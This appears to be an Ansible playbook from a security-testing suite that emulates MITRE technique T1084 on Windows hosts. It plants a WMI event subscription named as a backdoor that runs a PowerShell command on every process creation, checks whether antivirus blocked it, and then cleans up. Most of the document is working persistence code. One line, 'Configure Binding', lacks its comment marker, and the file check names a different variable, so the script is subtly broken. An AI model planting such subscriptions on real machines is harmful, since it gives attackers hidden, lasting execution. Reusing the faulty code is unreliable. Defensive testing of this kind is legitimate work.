# attack_technique: T1084
- name: T1084 - Windows Management Instrumentation Event Subscription
  hosts: windows
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
        - name: Create WMI Event subscription
          tags: always
          win_shell: |
            # Create Filter - User logging in
            $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
              EventNamespace = 'root/cimv2'
              Name = "Backdoor-Logon-Filter"
              #Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
              Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
              QueryLanguage = 'WQL'
            }
            # Configure Consumer with Command line
            $Command = "powershell.exe -Command Set-Content -Path C:\temp\{{ exfiltration_file }} -Value '{{ exfiltration_data }}'"
            $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
              Name = "Backdoor-Consumer"
              CommandLineTemplate = $Command }
              Configure Binding
            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
              Filter = $Filter
              Consumer = $Consumer}
              
        - name: sleep for 10 seconds and continue with play to check if AV removed or Not
          tags: always
          wait_for: timeout=10
          delegate_to: localhost
          
        - name: Check if startup file exist exist
          tags: always
          win_stat:
            path: C:\temp\{{ victim_file }}
          register: T1084
        
        - name: check if playbook was blocked
          tags: always
          debug: msg="Playbook Completed#T1084#blocked#win#"
          when: T1084.stat.exists == False        
        - name: check if playbook was successfull
          tags: always
          debug: msg="Playbook Completed#T1084#passed#win#"
          when: T1084.stat.exists    
          
        - name: cleanup STARTUP      
          tags: STARTUP
          win_shell: |
            $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Backdoor-Consumer'"
            $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'Backdoor-Logon-Filter'"
            $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
            $FilterConsumerBindingToCleanup | Remove-WmiObject
            $EventConsumerToCleanup | Remove-WmiObject
            $EventFilterToCleanup | Remove-WmiObject
          when: T1084.stat.exists 

